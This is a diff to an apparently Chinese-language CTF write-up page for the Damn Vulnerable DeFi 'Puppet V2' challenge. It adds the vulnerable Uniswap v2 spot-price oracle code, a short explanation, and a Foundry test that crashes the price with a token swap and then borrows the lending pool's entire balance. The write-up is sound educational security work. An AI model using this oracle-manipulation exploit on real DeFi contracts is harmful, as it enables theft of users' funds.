@@ -17,7 +17,7 @@
     
     
       
-        <title>Damn Vulnerable DeFi V3 - Chictf-Writeups</title>
+        <title>Damn Vulnerable DeFi V3 / V4 - Chictf-Writeups</title>
       
     
     
@@ -112,7 +112,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Damn Vulnerable DeFi V3
+              Damn Vulnerable DeFi V3 / V4
             
           </span>
         </div>
@@ -3733,6 +3733,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#9-puppet-v2" class="md-nav__link">
+    9. Puppet V2
+  </a>
+  
+    <nav class="md-nav" aria-label="9. Puppet V2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_6" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -4356,6 +4376,26 @@
           <li class="md-nav__item">
   <a href="#references" class="md-nav__link">
     References
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-puppet-v2" class="md-nav__link">
+    9. Puppet V2
+  </a>
+  
+    <nav class="md-nav" aria-label="9. Puppet V2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_6" class="md-nav__link">
+    Exploit
   </a>
   
 </li>
@@ -6468,13 +6508,98 @@
 <li><a href="https://docs.uniswap.org/contracts/v1/reference/exchange">Exchange | Uniswap</a></li>
 <li><a href="https://soliditydeveloper.com/erc20-permit#frontend-usage">A Long Way To Go: On Gasless Tokens and ERC20-Permit</a></li>
 </ul>
+<h2 id="9-puppet-v2">9. Puppet V2<a class="headerlink" href="#9-puppet-v2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Now they’re using a <a href="https://docs.uniswap.org/contracts/v2/overview">Uniswap v2 exchange</a> as a price oracle, along with the recommended utility libraries. That should be enough.</p>
+<p>You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance.</p>
+<p>Save all funds from the pool, depositing them into the designated recovery account.</p>
+</blockquote>
+<ul>
+<li>
+<p>借出代币所需 WETH 数量的计算由基于实时余额修改为基于存储的余额</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-48-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-48-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-48-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-48-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-48-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-48-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-48-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-48-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-48-10">10</a></span>
+<span class="normal"><a href="#__codelineno-48-11">11</a></span>
+<span class="normal"><a href="#__codelineno-48-12">12</a></span>
+<span class="normal"><a href="#__codelineno-48-13">13</a></span>
+<span class="normal"><a href="#__codelineno-48-14">14</a></span>
+<span class="normal"><a href="#__codelineno-48-15">15</a></span>
+<span class="normal"><a href="#__codelineno-48-16">16</a></span>
+<span class="normal"><a href="#__codelineno-48-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">calculateDepositOfWETHRequired</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">tokenAmount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2"></a><span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">depositFactor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">;</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_getOracleQuote</span><span class="p">(</span><span class="nx">tokenAmount</span><span class="p">).</span><span class="nx">mul</span><span class="p">(</span><span class="nx">depositFactor</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4"></a><span class="p">}</span>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5"></a>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6"></a><span class="c1">// Fetch the price from Uniswap v2 using the official libraries</span>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7"></a><span class="kd">function</span><span class="w"> </span><span class="nx">_getOracleQuote</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8"></a><span class="w">    </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">reservesWETH</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">reservesToken</span><span class="p">)</span><span class="w"> </span><span class="o">=</span>
+</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9"></a><span class="w">        </span><span class="nx">UniswapV2Library</span><span class="p">.</span><span class="nx">getReserves</span><span class="p">(</span><span class="nx">_uniswapFactory</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">_weth</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">_token</span><span class="p">));</span>
+</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">UniswapV2Library</span><span class="p">.</span><span class="nx">quote</span><span class="p">(</span><span class="nx">amount</span><span class="p">.</span><span class="nx">mul</span><span class="p">(</span><span class="mf">10</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mf">18</span><span class="p">),</span><span class="w"> </span><span class="nx">reservesToken</span><span class="p">,</span><span class="w"> </span><span class="nx">reservesWETH</span><span class="p">);</span>
+</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11"></a><span class="p">}</span>
+</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12"></a>
+</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13"></a><span class="kd">function</span><span class="w"> </span><span class="nx">quote</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">amountA</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">reserveA</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">reserveB</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">amountB</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14"></a><span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">amountA</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;UniswapV2Library: INSUFFICIENT_AMOUNT&#39;</span><span class="p">);</span>
+</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15"></a><span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">reserveA</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">reserveB</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#39;</span><span class="p">);</span>
+</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16"></a><span class="w">    </span><span class="nx">amountB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">amountA</span><span class="p">.</span><span class="nx">mul</span><span class="p">(</span><span class="nx">reserveB</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">reserveA</span><span class="p">;</span>
+</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+</li>
+<li>
+<p>因为 <code>player</code> 初始持有 10000 DVT，可以先使用 DVT 交换 WETH 以抬高 WETH 的价格，再调用 <code>borrow()</code> 清空 <code>PuppetV2Pool</code> 的代币</p>
+</li>
+</ul>
+<h3 id="exploit_6">Exploit<a class="headerlink" href="#exploit_6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-49-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-49-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-49-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-49-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-49-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-49-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-49-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-49-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-49-10">10</a></span>
+<span class="normal"><a href="#__codelineno-49-11">11</a></span>
+<span class="normal"><a href="#__codelineno-49-12">12</a></span>
+<span class="normal"><a href="#__codelineno-49-13">13</a></span>
+<span class="normal"><a href="#__codelineno-49-14">14</a></span>
+<span class="normal"><a href="#__codelineno-49-15">15</a></span>
+<span class="normal"><a href="#__codelineno-49-16">16</a></span>
+<span class="normal"><a href="#__codelineno-49-17">17</a></span>
+<span class="normal"><a href="#__codelineno-49-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">test_puppetV2</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">checkSolvedByPlayer</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2"></a><span class="w">    </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">uniswapV2Router</span><span class="p">),</span><span class="w"> </span><span class="nx">PLAYER_INITIAL_TOKEN_BALANCE</span><span class="p">);</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3"></a><span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4"></a><span class="w">    </span><span class="nx">path</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5"></a><span class="w">    </span><span class="nx">path</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">);</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6"></a><span class="w">    </span><span class="nx">uniswapV2Router</span><span class="p">.</span><span class="nx">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="p">(</span>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7"></a><span class="w">        </span><span class="nx">PLAYER_INITIAL_TOKEN_BALANCE</span><span class="p">,</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8"></a><span class="w">        </span><span class="mf">0</span><span class="p">,</span>
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9"></a><span class="w">        </span><span class="nx">path</span><span class="p">,</span>
+</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10"></a><span class="w">        </span><span class="nx">player</span><span class="p">,</span>
+</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11"></a><span class="w">        </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">60</span>
+</span><span id="__span-49-12"><a id="__codelineno-49-12" name="__codelineno-49-12"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-49-13"><a id="__codelineno-49-13" name="__codelineno-49-13"></a><span class="w">    </span><span class="nx">weth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">PLAYER_INITIAL_ETH_BALANCE</span><span class="p">}();</span>
+</span><span id="__span-49-14"><a id="__codelineno-49-14" name="__codelineno-49-14"></a><span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountToBorrow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">lendingPool</span><span class="p">.</span><span class="nx">calculateDepositOfWETHRequired</span><span class="p">(</span><span class="nx">POOL_INITIAL_TOKEN_BALANCE</span><span class="p">);</span>
+</span><span id="__span-49-15"><a id="__codelineno-49-15" name="__codelineno-49-15"></a><span class="w">    </span><span class="nx">weth</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">lendingPool</span><span class="p">),</span><span class="w"> </span><span class="nx">amountToBorrow</span><span class="p">);</span>
+</span><span id="__span-49-16"><a id="__codelineno-49-16" name="__codelineno-49-16"></a><span class="w">    </span><span class="nx">lendingPool</span><span class="p">.</span><span class="nx">borrow</span><span class="p">(</span><span class="nx">POOL_INITIAL_TOKEN_BALANCE</span><span class="p">);</span>
+</span><span id="__span-49-17"><a id="__codelineno-49-17" name="__codelineno-49-17"></a><span class="w">    </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">recovery</span><span class="p">,</span><span class="w"> </span><span class="nx">POOL_INITIAL_TOKEN_BALANCE</span><span class="p">);</span>
+</span><span id="__span-49-18"><a id="__codelineno-49-18" name="__codelineno-49-18"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="2023年10月11日 18:46:44">2023年10月11日 18:46:44</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="2025年5月6日 13:12:54">2025年5月6日 13:12:54</span>
       
     
   </small>
